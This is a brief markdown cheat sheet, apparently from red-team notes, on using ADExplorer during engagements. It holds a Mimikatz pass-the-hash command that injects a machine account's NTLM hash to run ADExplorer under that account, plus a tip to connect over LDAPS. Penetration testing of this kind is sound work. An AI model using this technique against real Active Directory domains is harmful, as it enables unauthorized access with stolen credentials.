# ADExplorer Tips & Trics

### [Injecting Hash](https://www.trustedsec.com/blog/adexplorer-on-engagements/)

Inject the machine account hash into a new modified ADExplorer.exe process

```
sekurlsa::pth /user:<name of machine account>$ /domain:<domainname.com> /ntlm:<machine account NTLM hash> /run:"c:\Program Files\Tools\adexplorer.exe"
```

It is preferred to use LDAPS whenever you can by using 636 as the port instead of the default 389.

```
Connect to: <IP>:636
```

```

```

```

```
